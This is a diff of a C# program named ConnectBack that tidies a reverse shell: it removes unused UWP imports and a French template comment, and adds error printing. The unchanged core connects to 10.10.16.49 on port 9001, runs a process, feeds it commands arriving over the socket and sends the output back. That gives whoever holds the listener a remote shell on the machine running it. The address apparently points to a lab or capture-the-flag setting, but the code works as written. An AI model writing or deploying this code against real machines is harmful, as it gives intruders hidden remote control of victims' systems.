@@ -1,33 +1,16 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using System.Runtime.InteropServices.WindowsRuntime;
-using Windows.Foundation;
-using Windows.Foundation.Collections;
-using Windows.UI.Xaml;
-using Windows.UI.Xaml.Controls;
-using Windows.UI.Xaml.Controls.Primitives;
-using Windows.UI.Xaml.Data;
-using Windows.UI.Xaml.Input;
-using Windows.UI.Xaml.Media;
-using Windows.UI.Xaml.Navigation;
 using System.Text;
 using System.Diagnostics;
-using System.ComponentModel;
-using System.Net;
 using System.Net.Sockets;
-
-// Pour plus d'informations sur le modèle d'élément Page vierge, consultez la page https://go.microsoft.com/fwlink/?LinkId=402352&clcid=0x409
-
 
 namespace ConnectBack
 {
-    public class Program
+    class Program
     {
         static StreamWriter streamWriter;
 
-        public static void Main(string[] args)
+        static void Main(string[] args)
         {
             using (TcpClient client = new TcpClient("10.10.16.49", 9001))
             {
@@ -53,7 +36,6 @@ namespace ConnectBack
                         while (true)
                         {
                             strInput.Append(rdr.ReadLine());
-                            //strInput.Append("\n");
                             p.StandardInput.WriteLine(strInput);
                             strInput.Remove(0, strInput.Length);
                         }
@@ -74,9 +56,11 @@ namespace ConnectBack
                     streamWriter.WriteLine(strOutput);
                     streamWriter.Flush();
                 }
-                catch (Exception err) { }
+                catch (Exception err)
+                {
+                    Console.WriteLine("Erreur : " + err.Message);
+                }
             }
         }
-
     }
 }
